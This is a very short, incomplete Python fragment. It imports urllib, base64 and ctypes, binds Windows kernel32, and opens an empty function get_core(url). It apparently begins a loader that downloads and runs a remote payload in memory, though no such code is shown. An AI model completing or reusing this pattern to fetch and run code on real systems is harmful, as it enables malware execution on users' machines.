from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_core(url):
    